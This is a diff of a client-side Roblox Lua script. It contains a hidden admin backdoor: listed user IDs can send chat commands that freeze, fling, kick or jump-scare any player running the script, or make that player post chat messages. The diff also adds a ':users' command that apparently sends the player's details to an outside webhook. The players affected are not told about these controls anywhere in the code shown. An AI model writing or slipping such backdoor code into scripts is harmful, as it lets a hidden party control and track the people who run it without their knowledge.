@@ -1,39 +1,36 @@
 local player = game.Players.LocalPlayer
+
 local Players = game:GetService("Players")
 
 local Admins = {
-    2935773828, --Airsoft#0001
-    413956126, ---Dilun#4181
-    2539559084, ---9tracks#0848
-    354429433, ---SxLn/lethal#0599
-    3242239583, ---twpiii#9519
-    1751254477, ---migsu#0001
-    1617667114, ---ela in roblox
+    2935773828, --Me
+    
 }
+
+
+
+
 local function commands(msg, plr)
     if table.find(Admins, plr) then
         local Mod = game:GetService("Players"):GetPlayerByUserId(plr)
         local Msg = string.lower(msg)
-        local SplitCMD = string.split(Msg, ",")
+        local SplitCMD = string.split(Msg, " ")
         local Lower = string.lower(player.Name)
         local Allowed = string.find(Lower, SplitCMD[2])
         if Allowed then
-            if string.find(SplitCMD[1], "!freeze") then
+            if string.find(SplitCMD[1], ":freeze") then
                 player.Character.HumanoidRootPart.Anchored = true
             end
-            if string.find(SplitCMD[1], "!unfreeze") then
+            if string.find(SplitCMD[1], ":unfreeze") then
                 player.Character.HumanoidRootPart.Anchored = false
             end
-        if message == "!users" then
-            if author ~= game.Players.LocalPlayer.Name then
-                local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
-                path:FireServer("SoftVortex on Top","all")
+            if string.find(SplitCMD[1], ":users") then
+                Webhook(player, "USERS")
             end
-        end
-            if string.find(SplitCMD[1], "!fling") then
+            if string.find(SplitCMD[1], ":fling") then
                 player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
             end
-             if string.find(SplitCMD[1], "!scare") then
+            if string.find(SplitCMD[1], ":scare") then
                 function Scare()
                     local ScreenGui = Instance.new("ScreenGui")
                     local ImageLabel = Instance.new("ImageLabel")
@@ -71,7 +68,7 @@ local function commands(msg, plr)
                     Scare()
                 end
             end
-            if string.find(SplitCMD[1], "!kick") then
+            if string.find(SplitCMD[1], ":kick") then
                 local ISADMIN = table.find(Admins, player.UserId)
                 if not ISADMIN then
                     player:Kick("Kicked.")
@@ -82,7 +79,10 @@ local function commands(msg, plr)
                 end
             end
         else
-end
+            if string.find(msg, "/e test") then
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", "All")
+            end
+        end
     end
 end
 
@@ -98,6 +98,7 @@ Players.PlayerAdded:Connect(
         end
     end
 )
+
 for i, v in pairs(game:GetService("Players"):GetChildren()) do
     local ADMINS = table.find(Admins, v.UserId)
     if ADMINS then
